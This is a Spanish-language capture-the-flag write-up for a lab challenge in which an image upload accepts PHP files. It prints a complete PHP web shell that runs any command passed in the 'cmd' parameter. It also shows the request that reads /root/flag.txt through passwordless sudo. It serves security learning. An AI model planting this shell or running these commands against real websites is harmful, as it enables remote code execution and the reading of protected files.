# n0s4n1ty 1

## Enunciado

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

## Resumen

Entro a la web y veo para poder subir una imagen cualquiera:

![[Pasted image 20261109221525.png]]

## Solución

### Subir una imagen e interceptar la petición con Burpsuite

Al interceptar la petición observo que puedo subir archivos modificados como php

### Buscar payload en `Online Reverse Shells`

Cojo el payload de php para una web shell

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

con esto y con sudo -l que me da que puedo ejecutar comandos en la maquina como sudo sin uso de contraseña saco la flag que el enunciado me dice que esta en `/root/flag.txt`

```
/uploads/shell.php?cmd=sudo+cat+%2Froot%2Fflag.txt
```

## Lo aprendido

- Subir una imagen sin verificarla puede dar a inyección de archivos php en este caso para una web shell que nos permite RCE (Ejecución remota de comandos).
- Siempre hay que verificar que permisos tiene el usuario antes de hacer nada cuando tienes un RCE con `sudo -l`.
